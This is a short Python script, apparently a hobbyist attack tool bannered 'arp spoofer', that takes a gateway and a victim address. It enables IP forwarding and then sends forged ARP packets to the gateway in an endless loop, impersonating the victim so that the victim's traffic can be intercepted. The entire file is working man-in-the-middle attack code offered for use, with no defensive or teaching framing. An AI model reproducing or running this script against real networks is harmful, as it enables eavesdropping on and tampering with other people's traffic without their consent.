#!/usr/bin/env python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from os import system
####################################################################################################
from sys import argv
if(len(argv) != 3): # print USAGE
    print '''
                                 ____                            __                    
                                / /\ \                          / _|                   
              __ _ _ __ _ __   / /  \ \   ___ _ __   ___   ___ | |_ ___ _ __           
             / _` | '__| '_ \ / /    \ \ / __| '_ \ / _ \ / _ \|  _/ _ \ '__|          
            | (_| | |  | |_) / /      \ \\__ \ |_) | (_) | (_) | ||  __/ |             
   _______   \__,_|_|  | .__/_/_       \_\___/ .__/ \___/ \___/|_| \___|_|         __  
  / / ____|        | | | |    | |      |  _ \| |          |  \/  |     | |         \ \ 
 | | |     ___   __| | |_|  __| |______| |_) |_|  _ ______| \  / | __ _| |__  _   _ | |
 | | |    / _ \ / _` |/ _ \/ _` |______|  _ <| | | |______| |\/| |/ _` | '_ \| | | || |
 | | |___| (_) | (_| |  __/ (_| |      | |_) | |_| |      | |  | | (_| | | | | |_| || |
 | |\_____\___/ \__,_|\___|\__,_|      |____/ \__, |      |_|  |_|\__,_|_| |_|\__, || |
  \_\                                          __/ |                           __/ /_/ 
                                              |___/                           |___/


USAGE: %s gateway victim''' % argv[0]
    exit(1)
else:
    script,gateway,victim=argv
#Enable Ip Forward (mandatory)
system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print "Started...\n"
#set interface (optional)
conf.iface='eth0'
#arp packet construction
apkt=ARP(psrc=victim,pdst=gateway)
#sending arp packets
send(apkt,verbose=0,inter=1,loop=1)
####################################################################################################
